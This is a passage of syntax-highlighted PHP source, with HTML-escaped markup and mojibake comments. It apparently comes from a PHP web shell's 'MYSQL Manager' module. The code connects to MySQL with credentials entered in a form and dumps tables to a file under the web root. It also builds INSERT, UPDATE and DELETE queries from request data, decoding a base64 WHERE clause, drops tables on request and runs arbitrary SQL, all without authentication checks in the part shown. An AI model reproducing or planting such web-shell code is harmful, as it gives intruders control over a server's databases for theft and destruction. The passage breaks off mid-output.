<span class="s2">       </span><span class="si">$dbform</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">charset</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">charset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$charset\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>

<span class="s2">   if (</span><span class="si">$doing</span><span class="s2"> == &#39;backupmysql&#39; &amp;&amp; </span><span class="si">$saveasfile</span><span class="s2">) {</span>
<span class="s2">       if (!</span><span class="si">$table</span><span class="s2">) {</span>
<span class="s2">           m(&#39;Please choose the table&#39;);</span>
<span class="s2">       } else {</span>
<span class="s2">           </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">,</span><span class="si">$dbuser</span><span class="s2">,</span><span class="si">$dbpass</span><span class="s2">,</span><span class="si">$dbname</span><span class="s2">,</span><span class="si">$charset</span><span class="s2">,</span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">           </span><span class="si">$fp</span><span class="s2"> = @fopen(</span><span class="si">$path</span><span class="s2">,&#39;w&#39;);</span>
<span class="s2">           if (</span><span class="si">$fp</span><span class="s2">) {</span>
<span class="s2">               foreach(</span><span class="si">$table</span><span class="s2"> as </span><span class="si">$k</span><span class="s2"> =&amp;gt; </span><span class="si">$v</span><span class="s2">) {</span>
<span class="s2">                   if (</span><span class="si">$v</span><span class="s2">) {</span>
<span class="s2">                       sqldumptable(</span><span class="si">$v</span><span class="s2">, </span><span class="si">$fp</span><span class="s2">);</span>
<span class="s2">                   }</span>
<span class="s2">               }</span>
<span class="s2">               fclose(</span><span class="si">$fp</span><span class="s2">);                </span>
<span class="s2">               </span><span class="si">$fileurl</span><span class="s2"> = str_replace(SA_ROOT,&#39;&#39;,</span><span class="si">$path</span><span class="s2">);</span>
<span class="s2">               m(&#39;Database has success backup to &amp;lt;a href=&quot;</span><span class="s1">&#39;.$fileurl.&#39;</span><span class="s2">&quot; target=&quot;</span><span class="nx">_blank</span><span class="s2">&quot;&amp;gt;&#39;.</span><span class="si">$path</span><span class="s2">.&#39;&amp;lt;/a&amp;gt;&#39;);</span>
<span class="s2">               mysql_close();</span>
<span class="s2">           } else {</span>
<span class="s2">               m(&#39;Backup failed&#39;);</span>
<span class="s2">           }</span>
<span class="s2">       }</span>
<span class="s2">   }</span>
<span class="s2">   if (</span><span class="si">$insert</span><span class="s2"> &amp;&amp; </span><span class="si">$insertsql</span><span class="s2">) {</span>
<span class="s2">       </span><span class="si">$keystr</span><span class="s2"> = </span><span class="si">$valstr</span><span class="s2"> = </span><span class="si">$tmp</span><span class="s2"> = &#39;&#39;;</span>
<span class="s2">       foreach(</span><span class="si">$insertsql</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&amp;gt; </span><span class="si">$val</span><span class="s2">) {</span>
<span class="s2">           if (</span><span class="si">$val</span><span class="s2">) {</span>
<span class="s2">               </span><span class="si">$keystr</span><span class="s2"> .= </span><span class="si">$tmp</span><span class="s2">.</span><span class="si">$key</span><span class="s2">;</span>
<span class="s2">               </span><span class="si">$valstr</span><span class="s2"> .= </span><span class="si">$tmp</span><span class="s2">.&quot;</span><span class="s1">&#39;&quot;.addslashes($val).&quot;&#39;</span><span class="s2">&quot;;</span>
<span class="s2">               </span><span class="si">$tmp</span><span class="s2"> = &#39;,&#39;;</span>
<span class="s2">           }</span>
<span class="s2">       }</span>
<span class="s2">       if (</span><span class="si">$keystr</span><span class="s2"> &amp;&amp; </span><span class="si">$valstr</span><span class="s2">) {</span>
<span class="s2">           </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">,</span><span class="si">$dbuser</span><span class="s2">,</span><span class="si">$dbpass</span><span class="s2">,</span><span class="si">$dbname</span><span class="s2">,</span><span class="si">$charset</span><span class="s2">,</span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">           m(q(&quot;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nv">$tablename</span> <span class="p">(</span><span class="nv">$keystr</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="nv">$valstr</span><span class="p">)</span><span class="s2">&quot;) ? &#39;Insert new record of success&#39; : mysql_error());</span>
<span class="s2">       }</span>
<span class="s2">   }</span>
<span class="s2">   if (</span><span class="si">$update</span><span class="s2"> &amp;&amp; </span><span class="si">$insertsql</span><span class="s2"> &amp;&amp; </span><span class="si">$base64</span><span class="s2">) {</span>
<span class="s2">       </span><span class="si">$valstr</span><span class="s2"> = </span><span class="si">$tmp</span><span class="s2"> = &#39;&#39;;</span>
<span class="s2">       foreach(</span><span class="si">$insertsql</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&amp;gt; </span><span class="si">$val</span><span class="s2">) {</span>
<span class="s2">           </span><span class="si">$valstr</span><span class="s2"> .= </span><span class="si">$tmp</span><span class="s2">.</span><span class="si">$key</span><span class="s2">.&quot;</span><span class="o">=</span><span class="s1">&#39;&quot;.addslashes($val).&quot;&#39;</span><span class="s2">&quot;;</span>
<span class="s2">           </span><span class="si">$tmp</span><span class="s2"> = &#39;,&#39;;</span>
<span class="s2">       }</span>
<span class="s2">       if (</span><span class="si">$valstr</span><span class="s2">) {</span>
<span class="s2">           </span><span class="si">$where</span><span class="s2"> = base64_decode(</span><span class="si">$base64</span><span class="s2">);</span>
<span class="s2">           </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">,</span><span class="si">$dbuser</span><span class="s2">,</span><span class="si">$dbpass</span><span class="s2">,</span><span class="si">$dbname</span><span class="s2">,</span><span class="si">$charset</span><span class="s2">,</span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">           m(q(&quot;</span><span class="nx">UPDATE</span> <span class="nv">$tablename</span> <span class="nx">SET</span> <span class="nv">$valstr</span> <span class="nx">WHERE</span> <span class="nv">$where</span> <span class="nx">LIMIT</span> <span class="mi">1</span><span class="s2">&quot;) ? &#39;Record updating&#39; : mysql_error());</span>
<span class="s2">       }</span>
<span class="s2">   }</span>
<span class="s2">   if (</span><span class="si">$doing</span><span class="s2"> == &#39;del&#39; &amp;&amp; </span><span class="si">$base64</span><span class="s2">) {</span>
<span class="s2">       </span><span class="si">$where</span><span class="s2"> = base64_decode(</span><span class="si">$base64</span><span class="s2">);</span>
<span class="s2">       </span><span class="si">$delete_sql</span><span class="s2"> = &quot;</span><span class="nx">DELETE</span> <span class="nx">FROM</span> <span class="nv">$tablename</span> <span class="nx">WHERE</span> <span class="nv">$where</span><span class="s2">&quot;;</span>
<span class="s2">       </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">,</span><span class="si">$dbuser</span><span class="s2">,</span><span class="si">$dbpass</span><span class="s2">,</span><span class="si">$dbname</span><span class="s2">,</span><span class="si">$charset</span><span class="s2">,</span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">       m(q(&quot;</span><span class="nx">DELETE</span> <span class="nx">FROM</span> <span class="nv">$tablename</span> <span class="nx">WHERE</span> <span class="nv">$where</span><span class="s2">&quot;) ? &#39;Deletion record of success&#39; : mysql_error());</span>
<span class="s2">   }</span>

<span class="s2">   if (</span><span class="si">$tablename</span><span class="s2"> &amp;&amp; </span><span class="si">$doing</span><span class="s2"> == &#39;drop&#39;) {</span>
<span class="s2">       </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">,</span><span class="si">$dbuser</span><span class="s2">,</span><span class="si">$dbpass</span><span class="s2">,</span><span class="si">$dbname</span><span class="s2">,</span><span class="si">$charset</span><span class="s2">,</span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">       if (q(&quot;</span><span class="nx">DROP</span> <span class="nx">TABLE</span> <span class="nv">$tablename</span><span class="s2">&quot;)) {</span>
<span class="s2">           m(&#39;Drop table of success&#39;);</span>
<span class="s2">           </span><span class="si">$tablename</span><span class="s2"> = &#39;&#39;;</span>
<span class="s2">       } else {</span>
<span class="s2">           m(mysql_error());</span>
<span class="s2">       }</span>
<span class="s2">   }</span>

<span class="s2">   formhead(array(&#39;title&#39;=&amp;gt;&#39;MYSQL Manager&#39;));</span>
<span class="s2">   makehide(&#39;action&#39;,&#39;mysqladmin&#39;);</span>
<span class="s2">   p(&#39;&amp;lt;p&amp;gt;&#39;);</span>
<span class="s2">   p(&#39;DBHost:&#39;);</span>
<span class="s2">   makeinput(array(&#39;name&#39;=&amp;gt;&#39;dbhost&#39;,&#39;size&#39;=&amp;gt;20,&#39;value&#39;=&amp;gt;</span><span class="si">$dbhost</span><span class="s2">));</span>
<span class="s2">   p(&#39;:&#39;);</span>
<span class="s2">   makeinput(array(&#39;name&#39;=&amp;gt;&#39;dbport&#39;,&#39;size&#39;=&amp;gt;4,&#39;value&#39;=&amp;gt;</span><span class="si">$dbport</span><span class="s2">));</span>
<span class="s2">   p(&#39;DBUser:&#39;);</span>
<span class="s2">   makeinput(array(&#39;name&#39;=&amp;gt;&#39;dbuser&#39;,&#39;size&#39;=&amp;gt;15,&#39;value&#39;=&amp;gt;</span><span class="si">$dbuser</span><span class="s2">));</span>
<span class="s2">   p(&#39;DBPass:&#39;);</span>
<span class="s2">   makeinput(array(&#39;name&#39;=&amp;gt;&#39;dbpass&#39;,&#39;size&#39;=&amp;gt;15,&#39;value&#39;=&amp;gt;</span><span class="si">$dbpass</span><span class="s2">));</span>
<span class="s2">   p(&#39;DBCharset:&#39;);</span>
<span class="s2">   makeselect(array(&#39;name&#39;=&amp;gt;&#39;charset&#39;,&#39;option&#39;=&amp;gt;</span><span class="si">$charsetdb</span><span class="s2">,&#39;selected&#39;=&amp;gt;</span><span class="si">$charset</span><span class="s2">,&#39;nokey&#39;=&amp;gt;1));</span>
<span class="s2">   makeinput(array(&#39;name&#39;=&amp;gt;&#39;connect&#39;,&#39;value&#39;=&amp;gt;&#39;Connect&#39;,&#39;type&#39;=&amp;gt;&#39;submit&#39;,&#39;class&#39;=&amp;gt;&#39;bt&#39;));</span>
<span class="s2">   p(&#39;&amp;lt;/p&amp;gt;&#39;);</span>
<span class="s2">   formfoot();</span>

<span class="s2">   //²Ù×÷¼ÇÂ¼</span>
<span class="s2">   formhead(array(&#39;name&#39;=&amp;gt;&#39;recordlist&#39;));</span>
<span class="s2">   makehide(&#39;doing&#39;);</span>
<span class="s2">   makehide(&#39;action&#39;,&#39;mysqladmin&#39;);</span>
<span class="s2">   makehide(&#39;base64&#39;);</span>
<span class="s2">   makehide(&#39;tablename&#39;);</span>
<span class="s2">   p(</span><span class="si">$dbform</span><span class="s2">);</span>
<span class="s2">   formfoot();</span>

<span class="s2">   //Ñ¡¶¨Êý¾Ý¿â</span>
<span class="s2">   formhead(array(&#39;name&#39;=&amp;gt;&#39;setdbname&#39;));</span>
<span class="s2">   makehide(&#39;action&#39;,&#39;mysqladmin&#39;);</span>
<span class="s2">   p(</span><span class="si">$dbform</span><span class="s2">);</span>
<span class="s2">   if (!</span><span class="si">$dbname</span><span class="s2">) {</span>
<span class="s2">       makehide(&#39;dbname&#39;);</span>
<span class="s2">   }</span>
<span class="s2">   formfoot();</span>

<span class="s2">   //Ñ¡¶¨±í</span>
<span class="s2">   formhead(array(&#39;name&#39;=&amp;gt;&#39;settable&#39;));</span>
<span class="s2">   makehide(&#39;action&#39;,&#39;mysqladmin&#39;);</span>
<span class="s2">   p(</span><span class="si">$dbform</span><span class="s2">);</span>
<span class="s2">   makehide(&#39;tablename&#39;);</span>
<span class="s2">   makehide(&#39;page&#39;,</span><span class="si">$page</span><span class="s2">);</span>
<span class="s2">   makehide(&#39;doing&#39;);</span>
<span class="s2">   formfoot();</span>

<span class="s2">   </span><span class="si">$cachetables</span><span class="s2"> = array(); </span>
<span class="s2">   </span><span class="si">$pagenum</span><span class="s2"> = 30;</span>
<span class="s2">   </span><span class="si">$page</span><span class="s2"> = intval(</span><span class="si">$page</span><span class="s2">);</span>
<span class="s2">   if(</span><span class="si">$page</span><span class="s2">) {</span>
<span class="s2">       </span><span class="si">$start_limit</span><span class="s2"> = (</span><span class="si">$page</span><span class="s2"> - 1) * </span><span class="si">$pagenum</span><span class="s2">;</span>
<span class="s2">   } else {</span>
<span class="s2">       </span><span class="si">$start_limit</span><span class="s2"> = 0;</span>
<span class="s2">       </span><span class="si">$page</span><span class="s2"> = 1;</span>
<span class="s2">   }</span>
<span class="s2">   if (isset(</span><span class="si">$dbhost</span><span class="s2">) &amp;&amp; isset(</span><span class="si">$dbuser</span><span class="s2">) &amp;&amp; isset(</span><span class="si">$dbpass</span><span class="s2">) &amp;&amp; isset(</span><span class="si">$connect</span><span class="s2">)) {</span>
<span class="s2">       </span><span class="si">$mysqllink</span><span class="s2"> = mydbconn(</span><span class="si">$dbhost</span><span class="s2">, </span><span class="si">$dbuser</span><span class="s2">, </span><span class="si">$dbpass</span><span class="s2">, </span><span class="si">$dbname</span><span class="s2">, </span><span class="si">$charset</span><span class="s2">, </span><span class="si">$dbport</span><span class="s2">);</span>
<span class="s2">       //»ñÈ¡Êý¾Ý¿âÐÅÏ¢</span>
<span class="s2">       </span><span class="si">$mysqlver</span><span class="s2"> = mysql_get_server_info();</span>
<span class="s2">       p(&#39;&amp;lt;p&amp;gt;MySQL &#39;.</span><span class="si">$mysqlver</span><span class="s2">.&#39; running in &#39;.</span><span class="si">$dbhost</span><span class="s2">.&#39; as &#39;.</span><span class="si">$dbuser</span><span class="s2">.&#39;@&#39;.</span><span class="si">$dbhost</span><span class="s2">.&#39;&amp;lt;/p&amp;gt;&#39;);</span>
<span class="s2">       </span><span class="si">$highver</span><span class="s2"> = </span><span class="si">$mysqlver</span><span class="s2"> &amp;gt; &#39;4.1&#39; ? 1 : 0;</span>

<span class="s2">       //»ñÈ¡Êý¾Ý¿â</span>
<span class="s2">       </span><span class="si">$query</span><span class="s2"> = q(&quot;</span><span class="nx">SHOW</span> <span class="nx">DATABASES</span><span class="s2">&quot;);</span>
<span class="s2">       </span><span class="si">$dbs</span><span class="s2"> = array();</span>
<span class="s2">       </span><span class="si">$dbs</span><span class="s2">[] = &#39;-- Select a database --&#39;;</span>
<span class="s2">       while(</span><span class="si">$db</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$query</span><span class="s2">)) {</span>
<span class="s2">           </span><span class="si">$dbs[$db[&#39;Database&#39;]</span><span class="s2">] = </span><span class="si">$db[&#39;Database&#39;]</span><span class="s2">;</span>
<span class="s2">       }</span>
<span class="s2">       makeselect(array(&#39;title&#39;=&amp;gt;&#39;Please select a database:&#39;,&#39;name&#39;=&amp;gt;&#39;db[]&#39;,&#39;option&#39;=&amp;gt;</span><span class="si">$dbs</span><span class="s2">,&#39;selected&#39;=&amp;gt;</span><span class="si">$dbname</span><span class="s2">,&#39;onchange&#39;=&amp;gt;&#39;moddbname(this.options[this.selectedIndex].value)&#39;,&#39;newline&#39;=&amp;gt;1));</span>
<span class="s2">       </span><span class="si">$tabledb</span><span class="s2"> = array();</span>
<span class="s2">       if (</span><span class="si">$dbname</span><span class="s2">) {</span>
<span class="s2">           p(&#39;&amp;lt;p&amp;gt;&#39;);</span>
<span class="s2">           p(&#39;Current dababase: &amp;lt;a href=&quot;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">moddbname</span><span class="p">(</span><span class="nx">\</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nv">$dbname</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dbname</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$tablename</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39; | Current Table: &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; [ &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;insert\&#39;);&quot;&amp;gt;Insert&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;structure\&#39;);&quot;&amp;gt;Structure&amp;lt;/a&amp;gt; | &amp;lt;a href=&quot;javascript:settable(\&#39;&#39;</span><span class="o">.</span><span class="nv">$tablename</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;drop\&#39;);&quot;&amp;gt;Drop&amp;lt;/a&amp;gt; ]&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$dbname</span><span class="p">);</span>

            <span class="nv">$getnumsql</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="nv">$runquery</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$runquery</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$allowedit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$tablename</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM </span><span class="si">$tablename</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="nv">$getnumsql</span> <span class="o">=</span> <span class="nv">$sql_query</span><span class="p">;</span>
                <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_query</span><span class="o">.</span><span class="s2">&quot; LIMIT </span><span class="si">$start_limit</span><span class="s2">, </span><span class="si">$pagenum</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="nv">$allowedit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;POST&quot;&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&amp;lt;table width=&quot;200&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td colspan=&quot;2&quot;&amp;gt;Run SQL query/queries on database &#39;</span><span class="o">.</span><span class="nv">$dbname</span><span class="o">.</span><span class="s1">&#39;:&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=&quot;sql_query&quot; class=&quot;area&quot; style=&quot;width:600px;height:50px;overflow:auto;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nx">ENT_QUOTES</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=&quot;padding:0 5px;&quot;&amp;gt;&amp;lt;input class=&quot;bt&quot; style=&quot;height:50px;&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Query&quot; /&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;tablename&#39;</span><span class="p">,</span> <span class="nv">$tablename</span><span class="p">);</span>
            <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;mysqladmin&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="nv">$dbform</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$tablename</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$runquery</span> <span class="o">&amp;&amp;</span> <span class="nv">$sql_query</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;structure&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SHOW FULL COLUMNS FROM </span><span class="si">$tablename</span><span class="s2">&quot;</span><span class="p">);</span>
                    <span class="nv">$rowdb</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$rowdb</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h3&amp;gt;Structure&amp;lt;/h3&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Field&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Collation&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Null&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Key&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Default&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Extra&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Privileges&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Comment&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$rowdb</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Type&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Collation&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Null&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Key&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Default&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Extra&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Privileges&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Comment&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;nbsp;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nx">tbfoot</span><span class="p">();</span>
                    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SHOW INDEX FROM </span><span class="si">$tablename</span><span class="s2">&quot;</span><span class="p">);</span>
                    <span class="nv">$rowdb</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$rowdb</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h3&amp;gt;Indexes&amp;lt;/h3&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;table border=&quot;0&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&#39;</span><span class="p">);</span>
                    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;Keyname&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
